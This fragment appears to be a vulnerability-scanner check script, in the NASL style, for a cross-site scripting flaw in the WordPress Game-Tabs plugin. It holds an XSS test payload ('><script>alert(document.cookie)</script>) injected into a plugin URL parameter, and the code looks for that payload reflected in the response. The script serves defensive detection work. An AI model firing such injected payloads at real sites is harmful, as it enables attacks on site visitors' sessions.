...
if(description)
{
  ...
  script_tag(name:"summary", value:"This host is installed with Wordpress Game-Tabs Plugin and is prone to
...
url = dir + "/wp-content/plugins/game-tabs/main_page.php?n='><script>" +
      "alert(document.cookie)</script>";

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\)</script>",
   extra_check:"Powered by WordPress"))
{
